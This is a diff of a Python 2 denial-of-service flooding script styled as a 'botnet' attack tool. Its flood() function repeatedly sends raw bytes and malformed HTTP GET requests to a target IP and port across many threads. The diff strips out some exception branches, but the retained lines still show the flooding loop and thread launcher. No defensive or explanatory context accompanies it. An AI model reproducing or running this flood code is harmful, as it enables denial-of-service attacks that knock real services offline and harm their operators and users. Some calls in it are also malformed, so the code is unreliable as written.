@@ -33,18 +33,7 @@ def flood():
                 s.send(bytes1)
                 http.send(bytes1)
             print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
-        except TypeError:
-            print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
-        except error:
-            print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
         except:
-            s.sendto(bytes1, (ip,port))
-            s.sendto(bytes2, (ip,port))
-            http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
-            http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
-            for i in range(thread):
-                s.send(bytes1)
-                http.send(bytes1)
             print "Attacking With %s Botnet | Target %s port %s"%(sent,ip,port)
 for i in range(thread):
     thr = threading.Thread(target=flood)
